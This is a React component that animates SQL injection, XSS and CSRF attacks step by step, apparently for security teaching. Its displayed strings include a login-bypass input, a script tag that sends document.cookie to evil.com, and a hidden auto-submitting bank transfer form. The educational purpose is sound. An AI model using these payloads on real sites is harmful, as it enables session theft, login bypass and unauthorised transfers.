'use client';

import React, { useState, useRef, useEffect } from 'react';
import { Button } from "@/components/ui/button";

/**
 * 漏洞类型定义
 * sql-injection: SQL注入攻击
 * xss: 跨站脚本攻击
 * csrf: 跨站请求伪造
 */
type VulnerabilityType = 'sql-injection' | 'xss' | 'csrf' | null;

/**
 * VulnerabilityDemo组件
 * 
 * 该组件用于可视化展示常见的Web安全漏洞攻击过程，包括：
 * 1. SQL注入攻击：展示攻击者如何通过操控SQL查询绕过登录验证
 * 2. XSS攻击：展示攻击者如何插入恶意JavaScript代码窃取用户Cookie
 * 3. CSRF攻击：展示攻击者如何利用用户的有效会话执行未授权操作
 * 
 * 组件提供交互式控制面板，可以选择漏洞类型、播放/暂停动画、调整播放速度等
 * 
 * @author Chryssolion Chen
 * @version 1.0.0
 */
const VulnerabilityDemo = () => {
  // 状态管理
  const [activeVulnerability, setActiveVulnerability] = useState<VulnerabilityType>(null); // 当前选中的漏洞类型
  const [animationStep, setAnimationStep] = useState(0); // 当前动画步骤
  const [isPlaying, setIsPlaying] = useState(false); // 是否正在播放动画
  const [speed, setSpeed] = useState(1); // 动画播放速度：1 = 正常速度，2 = 快速，0.5 = 慢速
  
  // 引用管理
  const terminalRef = useRef<HTMLDivElement>(null); // 终端输出区域的引用
  const animationRef = useRef<NodeJS.Timeout | null>(null); // 动画定时器的引用
  
  /**
   * 清理动画定时器，防止内存泄漏
   */
  const clearAnimationTimer = () => {
    if (animationRef.current) {
      clearTimeout(animationRef.current);
      animationRef.current = null;
    }
  };
  
  /**
   * 重置动画状态
   * 清理定时器并将动画步骤重置为0
   */
  const resetAnimation = () => {
    clearAnimationTimer();
    setAnimationStep(0);
    setIsPlaying(false);
  };
  
  /**
   * 切换漏洞类型
   * @param type 要切换到的漏洞类型
   */
  const switchVulnerability = (type: VulnerabilityType) => {
    resetAnimation();
    setActiveVulnerability(type);
  };
  
  /**
   * 播放/暂停动画
   * 切换isPlaying状态
   */
  const togglePlayPause = () => {
    setIsPlaying(!isPlaying);
  };
  
  /**
   * 调整动画播放速度
   * 循环切换速度: 0.5 (慢) -> 1 (正常) -> 2 (快) -> 0.5 (慢)...
   */
  const changeSpeed = () => {
    setSpeed(prev => prev === 0.5 ? 1 : prev === 1 ? 2 : 0.5);
  };
  
  // ===== 漏洞动画步骤定义 =====
  
  /**
   * SQL注入攻击的动画步骤
   * 每个步骤包含终端显示文本和对应的视觉效果类型
   */
  const sqlInjectionSteps = [
    { terminal: '-- 攻击者输入恶意SQL查询', visual: 'hacker-typing' },
    /**
     * 攻击者在登录表单中输入恶意用户名，使用SQL注释绕过密码验证
     * 此步骤展示了SQL注入攻击中攻击者如何通过构造特殊的输入来操控SQL查询
     * terminal: 终端显示的文本内容，即攻击者输入的恶意用户名
     * visual: 对应的视觉效果类型，这里表示表单输入阶段
     */
    { terminal: "用户名: admin' --", visual: 'form-input' },
    { terminal: "构建SQL查询: SELECT * FROM users WHERE username='admin' --' AND password='任意密码'", visual: 'query-building' },
    { terminal: "-- 注释掉了密码检查部分", visual: 'query-highlight' },
    { terminal: "执行查询...", visual: 'server-processing' },
    { terminal: "查询成功! 获取管理员权限", visual: 'access-granted' },
    { terminal: "-- 攻击成功: 无需密码登录为管理员", visual: 'hacker-success' }
  ];
  
  /**
   * XSS攻击的动画步骤
   * 展示攻击者如何通过插入恶意脚本窃取用户Cookie
   */
  const xssSteps = [
    { terminal: '-- 攻击者准备恶意JavaScript代码', visual: 'hacker-typing' },
    { terminal: '在评论框中输入: <script>fetch("https://evil.com/steal?cookie="+document.cookie)</script>', visual: 'comment-input' },
    { terminal: '网站未过滤HTML标签，保存恶意评论...', visual: 'server-storing' },
    { terminal: '其他用户访问包含恶意评论的页面', visual: 'user-browsing' },
    { terminal: '浏览器执行隐藏的JavaScript代码', visual: 'script-execution' },
    { terminal: '用户Cookie正在被发送到攻击者的服务器...', visual: 'data-transfer' },
    { terminal: '-- 攻击成功: 窃取了用户的会话信息', visual: 'hacker-success' }
  ];
  
  /**
   * CSRF攻击的动画步骤
   * 展示攻击者如何诱导用户在不知情的情况下执行未授权的操作
   */
  const csrfSteps = [
    { terminal: '-- 攻击者创建恶意网站', visual: 'hacker-typing' },
    { terminal: '嵌入隐藏的表单: <form action="https://bank.com/transfer" method="POST">', visual: 'hidden-form' },
    { terminal: '<input type="hidden" name="to" value="hacker" />', visual: 'form-fields' },
    { terminal: '<input type="hidden" name="amount" value="1000" />', visual: 'form-fields' },
    { terminal: '用户已登录银行网站(具有有效的Cookie)', visual: 'user-authenticated' },
    { terminal: '用户访问了攻击者的恶意网站', visual: 'user-browsing' },
    { terminal: '表单自动提交，发起转账请求', visual: 'request-sent' },
    { terminal: '银行网站接收请求(带有用户有效Cookie)', visual: 'server-processing' },
    { terminal: '-- 攻击成功: 完成了未授权的转账', visual: 'hacker-success' }
  ];
  
  /**
   * 获取当前选中漏洞类型的动画步骤数据
   * @returns 当前漏洞类型的步骤数组
   */
  const getCurrentSteps = () => {
    switch (activeVulnerability) {
      case 'sql-injection': return sqlInjectionSteps;
      case 'xss': return xssSteps;
      case 'csrf': return csrfSteps;
      default: return [];
    }
  };
  
  // ===== 副作用处理 =====
  
  /**
   * 动画逻辑效果
   * 根据isPlaying状态和动画步骤控制动画进度
   */
  useEffect(() => {
    const steps = getCurrentSteps();
    
    if (isPlaying && animationStep < steps.length) {
      // 根据速度调整动画间隔
      const delay = 2000 / speed; // 基础延迟2秒
      
      // 设置定时器，进入下一个动画步骤
      animationRef.current = setTimeout(() => {
        setAnimationStep(prev => prev + 1);
      }, delay);
    } else if (animationStep >= steps.length) {
      // 动画播放完毕，停止播放
      setIsPlaying(false);
    }
    
    // 组件卸载时清理定时器，防止内存泄漏
    return () => clearAnimationTimer();
  }, [isPlaying, animationStep, activeVulnerability, speed]);
  
  /**
   * 自动滚动终端到底部，确保最新输出内容可见
   */
  useEffect(() => {
    if (terminalRef.current) {
      terminalRef.current.scrollTop = terminalRef.current.scrollHeight;
    }
  }, [animationStep]);
  
  // ===== 渲染辅助函数 =====
  
  /**
   * 渲染终端输出内容
   * 显示截至当前步骤的所有终端输出
   * @returns JSX元素数组
   */
  const renderTerminalOutput = () => {
    const steps = getCurrentSteps();
    return steps.slice(0, animationStep + 1).map((step, index) => (
      <div key={index} className="terminal-line">
        <span className={step.visual === 'hacker-success' ? 'text-green-400' : 'text-green-300'}>
          {step.terminal}
        </span>
      </div>
    ));
  };
  
  /**
   * 渲染可视化动画内容
   * 根据当前步骤和视觉效果类型返回对应的动画组件
   * @returns JSX元素
   */
  const renderVisualAnimation = () => {
    // 如果没有选择漏洞类型或动画已播放完毕，返回空
    if (!activeVulnerability || animationStep >= getCurrentSteps().length) {
      return null;
    }
    
    // 获取当前步骤的信息
    const currentStep = getCurrentSteps()[animationStep];
    const visual = currentStep.visual;
    
    // 根据不同的视觉效果类型返回不同的动画组件
    switch (visual) {
      // 攻击者输入阶段
      case 'hacker-typing':
        return (
          <div className="flex items-center justify-center h-full">
            <div className="text-xl animate-pulse text-red-500">👨‍💻 攻击者正在输入...</div>
          </div>
        );
      
      // 表单输入阶段(SQL注入或XSS)
      /**
       * 处理表单输入阶段的视觉效果
       * 当动画步骤为 'form-input' 或 'comment-input' 时，渲染相应的表单输入界面
       * 用于展示 SQL 注入攻击的登录表单输入或 XSS 攻击的评论表单输入
       */
      case 'form-input':
      case 'comment-input':
        return (
          // 表单容器，设置背景颜色、圆角、内边距、阴影和最大宽度，并居中显示
          <div className="bg-red dark:bg-gray-800 rounded p-4 shadow-lg max-w-md mx-auto">
            {/* 表单标题，根据不同的漏洞类型显示不同的标题 */}
            <div className="mb-2 text-sm font-bold">{activeVulnerability === 'sql-injection' ? '登录表单' : '评论表单'}</div>
            {/* 表单输入区域，根据不同的漏洞类型设置不同的边框颜色和背景颜色 */}
            <div className={`p-2 border rounded ${activeVulnerability === 'sql-injection' ? 'border-red-500 bg-red-100 dark:bg-red-900/30' : 'border-yellow-500 bg-yellow-100 dark:bg-yellow-900/30'}`}>
              {/* 显示攻击者输入的恶意内容，根据不同的漏洞类型显示不同的内容 */}
              {activeVulnerability === 'sql-injection' ? "admin' --" : "<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>"}
            </div>
          </div>
        );
      
      // SQL查询构建和高亮阶段
      /**
       * 处理SQL查询构建和高亮阶段的视觉效果
       * 展示攻击者构造的恶意SQL查询，在查询高亮阶段会对密码检查部分进行弱化显示
       */
      case 'query-building':
      case 'query-highlight':
        return (
          // 容器，设置背景颜色、圆角、内边距、字体样式、文本大小、文本颜色和溢出处理
          <div className="bg-gray-900 rounded-md p-3 font-mono text-sm text-white overflow-x-auto">
            {/* 显示SQL查询的固定部分 */}
            <span>SELECT * FROM users WHERE username=</span>
            {/* 显示攻击者输入的恶意用户名部分，使用红色突出显示 */}
            <span className="text-red-400">'admin' --'</span>
            {/* 根据视觉效果类型，对密码检查部分进行处理，高亮时添加透明度和删除线 */}
            <span className={visual === 'query-highlight' ? 'opacity-50 line-through' : ''}>
              AND password='任意密码'
            </span>
          </div>
        );
      
      /**
       * 处理服务器处理和存储阶段的视觉效果
       * 显示一个旋转的加载图标和相应的提示信息
       */
      case 'server-processing':
      case 'server-storing':
        return (
          // 容器，设置为弹性布局，垂直和水平居中对齐
          <div className="flex flex-col items-center justify-center">
            <div className="w-16 h-16 border-4 border-t-blue-500 border-r-transparent border-b-transparent border-l-transparent rounded-full animate-spin mb-2"></div>
            <div className="text-sm">{activeVulnerability === 'sql-injection' ? '数据库处理查询...' : '服务器存储数据...'}</div>
          </div>
        );
      
      // 攻击成功阶段
      case 'access-granted':
      case 'hacker-success':
        return (
          <div className="bg-green-100 dark:bg-green-900/30 border border-green-500 rounded-md p-4 text-center">
            <div className="text-green-600 dark:text-green-400 text-lg font-bold mb-1">攻击成功!</div>
            <div className="text-sm">
              {activeVulnerability === 'sql-injection' ? '获得管理员访问权限' : 
               activeVulnerability === 'xss' ? '成功窃取用户Cookie' : 
               '完成未授权的资金转账'}
            </div>
          </div>
        );
      
      // 用户浏览网页阶段
      case 'user-browsing':
        return (
          <div className="bg-blue-100 dark:bg-blue-900/30 border border-blue-500 rounded-md p-4">
            <div className="text-center mb-2">👤 普通用户浏览网页</div>
            <div className="bg-red dark:bg-gray-800 p-2 rounded border border-gray-300 dark:border-gray-600 text-xs">
              {activeVulnerability === 'xss' ? 
                <div>
                  <div className="mb-1">评论区:</div>
                  <div className="p-1 mb-1">很棒的文章!</div>
                  <div className="p-1 bg-red-100 dark:bg-red-900/30 border border-red-500 rounded">
                    <span className="opacity-70">&lt;script&gt;(隐藏的恶意代码)&lt;/script&gt;</span>
                  </div>
                </div> :
                <div>
                  <div className="mb-1">精美网站:</div>
                  <div className="p-1">点击查看有趣内容</div>
                  <div className="p-1 bg-red-100 dark:bg-red-900/30 border border-red-500 rounded">
                    <span className="opacity-70">(隐藏的恶意表单)</span>
                  </div>
                </div>
              }
            </div>
          </div>
        );
      
      // JavaScript脚本执行阶段(XSS)
      case 'script-execution':
        return (
          <div className="flex flex-col items-center">
            <div className="mb-2">JavaScript 正在执行...</div>
            <div className="bg-yellow-100 dark:bg-yellow-900/30 p-2 rounded-md border border-yellow-500 mb-2 font-mono text-xs overflow-x-auto w-full max-w-xs">
              <div className="animate-pulse">document.cookie</div>
              <div className="text-gray-600 dark:text-gray-400">⤷ "session=123abc; auth=xyz789"</div>
            </div>
            <div className="animate-bounce text-red-500">↓ 数据外泄中</div>
          </div>
        );
      
      // 数据传输阶段(XSS)
      case 'data-transfer':
        return (
          <div className="relative mx-auto w-full max-w-md h-20">
            <div className="absolute left-0 top-5 bg-blue-500 dark:bg-blue-600 rounded-md px-3 py-1 text-white text-xs">
              用户浏览器
            </div>
            <div className="absolute right-0 top-5 bg-red-500 dark:bg-red-600 rounded-md px-3 py-1 text-white text-xs">
              攻击者服务器
            </div>
            <div className="absolute left-20 top-7 h-0.5 bg-red-400 right-20 animate-[width_1.5s_ease-in-out_infinite]">
              <div className="absolute right-0 top-[-3px] w-2 h-2 bg-red-500 rounded-full animate-pulse"></div>
            </div>
            <div className="absolute left-1/2 transform -translate-x-1/2 top-10 text-xs text-red-500">
              Cookie数据传输中...
            </div>
          </div>
        );
      
      // CSRF攻击的表单代码展示
      case 'hidden-form':
      case 'form-fields':
        return (
          <div className="bg-gray-900 rounded-md p-3 font-mono text-sm text-white overflow-x-auto">
            <div className="text-blue-400">&lt;form</div>
            <div className="pl-4">action=<span className="text-green-400">"https://bank.com/transfer"</span></div>
            <div className="pl-4">method=<span className="text-green-400">"POST"</span></div>
            <div className="text-blue-400">&gt;</div>
            {visual === 'form-fields' && (
              <>
                <div className="pl-2 text-blue-400">&lt;input</div>
                <div className="pl-6">type=<span className="text-green-400">"hidden"</span></div>
                <div className="pl-6">name=<span className="text-green-400">"to"</span></div>
                <div className="pl-6">value=<span className="text-red-400">"hacker"</span></div>
                <div className="pl-2 text-blue-400">/&gt;</div>
                <div className="pl-2 text-blue-400">&lt;input</div>
                <div className="pl-6">type=<span className="text-green-400">"hidden"</span></div>
                <div className="pl-6">name=<span className="text-green-400">"amount"</span></div>
                <div className="pl-6">value=<span className="text-red-400">"1000"</span></div>
                <div className="pl-2 text-blue-400">/&gt;</div>
              </>
            )}
          </div>
        );
      
      // 用户已认证状态展示(CSRF)
      case 'user-authenticated':
        return (
          <div className="bg-green-100 dark:bg-green-900/30 border border-green-500 rounded-md p-3">
            <div className="flex items-center gap-2">
              <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5 text-green-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
              </svg>
              <div className="text-sm">用户已登录到银行网站</div>
            </div>
            <div className="text-xs text-gray-600 dark:text-gray-400 mt-1">
              Cookie: session=valid-bank-session-xyz
            </div>
          </div>
        );
      
      // 请求发送阶段(CSRF)
      case 'request-sent':
        return (
          <div className="relative mx-auto w-full max-w-md h-20">
            <div className="absolute left-0 top-5 bg-blue-500 dark:bg-blue-600 rounded-md px-3 py-1 text-white text-xs">
              用户浏览器
            </div>
            <div className="absolute right-0 top-5 bg-green-500 dark:bg-green-600 rounded-md px-3 py-1 text-white text-xs">
              bank.com
            </div>
            <div className="absolute left-20 top-7 h-0.5 bg-yellow-400 right-20 animate-[width_1.5s_ease-in-out_infinite]">
              <div className="absolute right-0 top-[-3px] w-2 h-2 bg-yellow-500 rounded-full animate-pulse"></div>
            </div>
            <div className="absolute left-1/2 transform -translate-x-1/2 top-10 text-xs text-yellow-500">
              POST /transfer {"{to:'hacker',amount:1000}"}
            </div>
          </div>
        );
      
      // 默认情况返回空
      default:
        return null;
    }
  };
  
  // ===== 组件主体渲染 =====
  return (
    <div className="relative bg-black rounded-lg overflow-hidden shadow-lg border border-gray-700 dark:border-blue-800">
      {/* 动态星空背景 */}
      <div className="absolute inset-0 overflow-hidden">
        <div className="stars-container absolute inset-0">
          <div className="star"></div>
          <div className="star"></div>
          <div className="star"></div>
          <div className="star"></div>
          <div className="star"></div>
          <div className="star"></div>
          <div className="star"></div>
          <div className="star"></div>
          <div className="star"></div>
          <div className="star"></div>
          <div className="star"></div>
          <div className="star"></div>
          <div className="star"></div>
          <div className="star"></div>
          <div className="star"></div>
          <div className="star"></div>
          <div className="star"></div>
          <div className="star"></div>
          <div className="star"></div>
          <div className="star"></div>
          <div className="star"></div>
          <div className="star"></div>
          <div className="star"></div>
          <div className="star"></div>
          <div className="star"></div>
          <div className="star"></div>
          <div className="star"></div>
          <div className="star"></div>
          <div className="star"></div>
          <div className="star"></div>
          <div className="star"></div>
          <div className="star"></div>
        </div>
        <div className="absolute inset-0 bg-gradient-to-br from-blue-900/40 via-black/60 to-purple-900/40"></div>
      </div>
      
      {/* 标题栏 */}
      <div className="relative bg-gradient-to-r from-blue-900 to-purple-900 text-white px-4 py-3 z-10">
        <h3 className="text-base font-bold">安全漏洞演示</h3>
        <p className="text-xs text-blue-100">可视化展示常见的Web安全漏洞攻击过程</p>
      </div>
      
      {/* 漏洞选择按钮组 */}
      <div className="relative p-3 flex gap-2 overflow-x-auto bg-gray-900/80 backdrop-blur-sm z-10">
        <Button
          variant={activeVulnerability === 'sql-injection' ? 'destructive' : 'outline'}
          size="sm"
          onClick={() => switchVulnerability('sql-injection')}
          className={`text-xs ${activeVulnerability === 'sql-injection' ? '' : 'border-red-500 text-red-400 hover:text-red-500 hover:bg-red-950/30'}`}
        >
          SQL注入
        </Button>
        <Button
          variant={activeVulnerability === 'xss' ? 'default' : 'outline'}
          size="sm"
          onClick={() => switchVulnerability('xss')}
          className={`text-xs ${activeVulnerability === 'xss' ? 'bg-amber-600 hover:bg-amber-700' : 'border-amber-500 text-amber-400 hover:text-amber-500 hover:bg-amber-950/30'}`}
        >
          XSS攻击
        </Button>
        <Button
          variant={activeVulnerability === 'csrf' ? 'default' : 'outline'}
          size="sm"
          onClick={() => switchVulnerability('csrf')}
          className={`text-xs ${activeVulnerability === 'csrf' ? 'bg-purple-600 hover:bg-purple-700' : 'border-purple-500 text-purple-400 hover:text-purple-500 hover:bg-purple-950/30'}`}
        >
          CSRF攻击
        </Button>
      </div>
      
      {/* 动画控制区 - 只在选择了漏洞类型时显示 */}
      {activeVulnerability && (
        <div className="relative p-2 flex justify-between items-center bg-gray-900/60 backdrop-blur-sm border-t border-b border-gray-700 z-10">
          <div className="flex items-center gap-2">
            {/* 播放/暂停按钮 */}
            <Button
              variant="outline"
              size="sm"
              onClick={togglePlayPause}
              className="text-xs border-cyan-600 text-cyan-400 hover:text-cyan-300 hover:bg-cyan-950/30"
            >
              {isPlaying ? (
                <span className="flex items-center gap-1">
                  <svg xmlns="http://www.w3.org/2000/svg" className="h-3 w-3" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M10 9v6m4-6v6m7-3a9 9 0 11-18 0 9 9 0 0118 0z" />
                  </svg>
                  暂停
                </span>
              ) : (
                <span className="flex items-center gap-1">
                  <svg xmlns="http://www.w3.org/2000/svg" className="h-3 w-3" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M14.752 11.168l-3.197-2.132A1 1 0 0010 9.87v4.263a1 1 0 001.555.832l3.197-2.132a1 1 0 000-1.664z" />
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
                  </svg>
                  播放
                </span>
              )}
            </Button>
            {/* 重置按钮 */}
            <Button
              variant="outline"
              size="sm"
              onClick={resetAnimation}
              className="text-xs border-blue-600 text-blue-400 hover:text-blue-300 hover:bg-blue-950/30"
              disabled={animationStep === 0}
            >
              <svg xmlns="http://www.w3.org/2000/svg" className="h-3 w-3 mr-1" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" />
              </svg>
              重置
            </Button>
          </div>
          {/* 速度控制按钮 */}
          <div>
            <Button
              variant="ghost"
              size="sm"
              onClick={changeSpeed}
              className="text-xs text-teal-400 hover:text-teal-300 hover:bg-teal-950/30"
            >
              速度: {speed === 0.5 ? '慢速' : speed === 1 ? '正常' : '快速'}
            </Button>
          </div>
        </div>
      )}
      
      {/* 动画展示区域 - 根据是否选择了漏洞类型显示不同内容 */}
      {activeVulnerability ? (
        // 选择了漏洞类型时显示动画内容
        <div className="relative grid grid-cols-1 lg:grid-cols-2 gap-3 p-3 z-10">
          {/* 可视化动画区域 */}
          <div className="bg-gray-900/60 backdrop-blur-sm rounded-lg p-3 h-[200px] flex items-center justify-center">
            {renderVisualAnimation()}
          </div>
          
          {/* 终端输出区域 */}
          <div 
            ref={terminalRef}
            className="bg-gray-950 text-green-300 font-mono text-xs p-3 rounded-lg h-[200px] overflow-y-auto border border-gray-700"
          >
            <div className="mb-2 text-blue-400">-- {activeVulnerability === 'sql-injection' ? 'SQL注入攻击' : activeVulnerability === 'xss' ? 'XSS跨站脚本攻击' : 'CSRF跨站请求伪造'} 演示 --</div>
            {renderTerminalOutput()}
            {isPlaying && <div className="h-4 w-2 bg-green-500 inline-block ml-1 animate-pulse"></div>}
          </div>
        </div>
      ) : (
        // 未选择漏洞类型时显示引导内容
        <div className="relative p-6 text-center z-10">
          <p className="text-gray-300">选择一种安全漏洞类型开始演示</p>
          <div className="mt-3 flex justify-center gap-8">
            {/* SQL注入图标 */}
            <div className="text-center">
              <div className="w-12 h-12 mx-auto bg-red-900/30 border border-red-700/50 rounded-full flex items-center justify-center mb-1 hover:bg-red-900/50 hover:border-red-600 transition-all duration-300 cursor-pointer" onClick={() => switchVulnerability('sql-injection')}>
                <span role="img" aria-label="sql injection" className="text-lg">💉</span>
              </div>
              <p className="text-xs text-red-400">SQL注入</p>
            </div>
            {/* XSS攻击图标 */}
            <div className="text-center">
              <div className="w-12 h-12 mx-auto bg-amber-900/30 border border-amber-700/50 rounded-full flex items-center justify-center mb-1 hover:bg-amber-900/50 hover:border-amber-600 transition-all duration-300 cursor-pointer" onClick={() => switchVulnerability('xss')}>
                <span role="img" aria-label="xss" className="text-lg">📝</span>
              </div>
              <p className="text-xs text-amber-400">XSS攻击</p>
            </div>
            {/* CSRF攻击图标 */}
            <div className="text-center">
              <div className="w-12 h-12 mx-auto bg-purple-900/30 border border-purple-700/50 rounded-full flex items-center justify-center mb-1 hover:bg-purple-900/50 hover:border-purple-600 transition-all duration-300 cursor-pointer" onClick={() => switchVulnerability('csrf')}>
                <span role="img" aria-label="csrf" className="text-lg">🔄</span>
              </div>
              <p className="text-xs text-purple-400">CSRF攻击</p>
            </div>
          </div>
        </div>
      )}
      
      {/* 信息提示区 */}
      <div className="relative bg-gray-900/60 backdrop-blur-sm p-3 border-t border-gray-700 z-10">
        <div className="text-xs text-gray-400">
          <p className="mb-1 flex items-center gap-1">
            <svg xmlns="http://www.w3.org/2000/svg" className="h-3 w-3" fill="none" viewBox="0 0 24 24" stroke="currentColor">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
            </svg>
            此动画仅用于教育目的，展示网络安全漏洞的工作原理。
          </p>
          <p className="flex items-center gap-1">
            <svg xmlns="http://www.w3.org/2000/svg" className="h-3 w-3" fill="none" viewBox="0 0 24 24" stroke="currentColor">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
            </svg>
            了解这些漏洞有助于开发更安全的应用程序。
          </p>
        </div>
      </div>

      {/* 星空动画样式 */}
      <style jsx>{`
        .stars-container {
          background: radial-gradient(ellipse at bottom, #1b2735 0%, #090a0f 100%);
          z-index: 0;
        }
        
        .star {
          position: absolute;
          background-color: white;
          border-radius: 50%;
          opacity: 0;
          animation: twinkle var(--duration, 5s) infinite var(--delay, 0s);
        }
        
        .star:nth-child(1) { --size: 2px; width: var(--size); height: var(--size); left: 10%; top: 15%; --duration: 5s; --delay: 0.5s; }
        .star:nth-child(2) { --size: 1px; width: var(--size); height: var(--size); left: 20%; top: 25%; --duration: 6s; --delay: 1.5s; }
        .star:nth-child(3) { --size: 3px; width: var(--size); height: var(--size); left: 30%; top: 10%; --duration: 7s; --delay: 2.5s; }
        .star:nth-child(4) { --size: 1px; width: var(--size); height: var(--size); left: 40%; top: 20%; --duration: 8s; --delay: 0s; }
        .star:nth-child(5) { --size: 2px; width: var(--size); height: var(--size); left: 50%; top: 30%; --duration: 5s; --delay: 3s; }
        .star:nth-child(6) { --size: 1px; width: var(--size); height: var(--size); left: 60%; top: 5%; --duration: 6s; --delay: 1s; }
        .star:nth-child(7) { --size: 3px; width: var(--size); height: var(--size); left: 70%; top: 35%; --duration: 7s; --delay: 2s; }
        .star:nth-child(8) { --size: 2px; width: var(--size); height: var(--size); left: 80%; top: 15%; --duration: 8s; --delay: 0.5s; }
        .star:nth-child(9) { --size: 1px; width: var(--size); height: var(--size); left: 90%; top: 25%; --duration: 5s; --delay: 1.5s; }
        .star:nth-child(10) { --size: 2px; width: var(--size); height: var(--size); left: 15%; top: 40%; --duration: 6s; --delay: 2.5s; }
        .star:nth-child(11) { --size: 3px; width: var(--size); height: var(--size); left: 25%; top: 50%; --duration: 7s; --delay: 0s; }
        .star:nth-child(12) { --size: 1px; width: var(--size); height: var(--size); left: 35%; top: 60%; --duration: 8s; --delay: 3s; }
        .star:nth-child(13) { --size: 2px; width: var(--size); height: var(--size); left: 45%; top: 45%; --duration: 5s; --delay: 1s; }
        .star:nth-child(14) { --size: 1px; width: var(--size); height: var(--size); left: 55%; top: 55%; --duration: 6s; --delay: 2s; }
        .star:nth-child(15) { --size: 3px; width: var(--size); height: var(--size); left: 65%; top: 65%; --duration: 7s; --delay: 0.5s; }
        .star:nth-child(16) { --size: 2px; width: var(--size); height: var(--size); left: 75%; top: 75%; --duration: 8s; --delay: 1.5s; }
        .star:nth-child(17) { --size: 1px; width: var(--size); height: var(--size); left: 85%; top: 70%; --duration: 5s; --delay: 2.5s; }
        .star:nth-child(18) { --size: 2px; width: var(--size); height: var(--size); left: 95%; top: 85%; --duration: 6s; --delay: 0s; }
        .star:nth-child(19) { --size: 3px; width: var(--size); height: var(--size); left: 5%; top: 80%; --duration: 7s; --delay: 3s; }
        .star:nth-child(20) { --size: 1px; width: var(--size); height: var(--size); left: 15%; top: 90%; --duration: 8s; --delay: 1s; }
        .star:nth-child(21) { --size: 2px; width: var(--size); height: var(--size); left: 25%; top: 85%; --duration: 5s; --delay: 2s; }
        .star:nth-child(22) { --size: 1px; width: var(--size); height: var(--size); left: 35%; top: 95%; --duration: 6s; --delay: 0.5s; }
        .star:nth-child(23) { --size: 3px; width: var(--size); height: var(--size); left: 45%; top: 80%; --duration: 7s; --delay: 1.5s; }
        .star:nth-child(24) { --size: 2px; width: var(--size); height: var(--size); left: 55%; top: 90%; --duration: 8s; --delay: 2.5s; }
        .star:nth-child(25) { --size: 1px; width: var(--size); height: var(--size); left: 65%; top: 85%; --duration: 5s; --delay: 0s; }
        .star:nth-child(26) { --size: 2px; width: var(--size); height: var(--size); left: 75%; top: 95%; --duration: 6s; --delay: 3s; }
        .star:nth-child(27) { --size: 3px; width: var(--size); height: var(--size); left: 85%; top: 80%; --duration: 7s; --delay: 1s; }
        .star:nth-child(28) { --size: 1px; width: var(--size); height: var(--size); left: 95%; top: 90%; --duration: 8s; --delay: 2s; }
        .star:nth-child(29) { --size: 2px; width: var(--size); height: var(--size); left: 5%; top: 45%; --duration: 5s; --delay: 0.5s; }
        .star:nth-child(30) { --size: 3px; width: var(--size); height: var(--size); left: 95%; top: 45%; --duration: 6s; --delay: 1.5s; }
        
        @keyframes twinkle {
          0%, 100% { opacity: 0; transform: translateY(0); }
          25% { opacity: 0.8; transform: translateY(-1px); }
          50% { opacity: 1; transform: translateY(-2px); }
          75% { opacity: 0.8; transform: translateY(-1px); }
        }
      `}</style>
    </div>
  );
};

export default VulnerabilityDemo; 